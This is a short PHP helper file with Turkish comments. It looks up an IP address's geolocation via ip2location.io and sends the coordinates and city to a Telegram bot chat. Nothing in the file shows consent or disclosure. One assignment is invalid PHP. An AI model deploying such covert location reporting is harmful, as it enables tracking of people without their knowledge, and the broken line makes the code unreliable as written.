<?php
function TelegramBildirim($body){
    $token = ''; // token_telegram_group
    $user_id = -; // users_telegram_id

    $request_params = [
        'chat_id' => $user_id,
        'text' => $body
    ];
    //////////////////////////////////
    $request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);

    file_get_contents($request_url);
}



function TelegramLocation($ip)
{
    // Telegram bot token
    $token = ''; // token_telegram_group
    $user_id = ''; // users_telegram_id

    // ip2location.io API key
    $key = '';

    // ip2location.io API'ye istek gönder
    $geolocationUrl = 'https://api.ip2location.io/?key=' . $key . '&ip=' . $ip;

    // IP adresinden konum bilgisini al
    $response = file_get_contents($geolocationUrl);
    $geolocation = json_decode($response, true);
    sleep(2);

    $country_code = $geolocation['country_code'];
    $region_name = $geolocation['region_name'];
    $city_name = $geolocation['city_name'];
    $bodyy = "\n"."COUNTRY: ".$country_code."\n"."REGION: ".$region_name."\n"."CITY: ".$city_name;

    if ($geolocation && isset($geolocation['latitude']) && isset($geolocation['longitude'])) {
        // Konum bilgilerini hazırla
        $latitude = $geolocation['latitude'];
        $longitude = $geolocation['longitude'];

        // Telegram API'ye konum gönderme işlemi için gerekli parametreler
        $locationParams = [
            'chat_id' => $user_id,
            'latitude' => $latitude,
            'longitude' => $longitude
        ];

        // Telegram API'ye istek gönder
        $telegramApiUrl = "https://api.telegram.org/bot{$token}/sendLocation?" . http_build_query($locationParams);
        file_get_contents($telegramApiUrl);
        TelegramBildirim($bodyy);
    }
}
?>


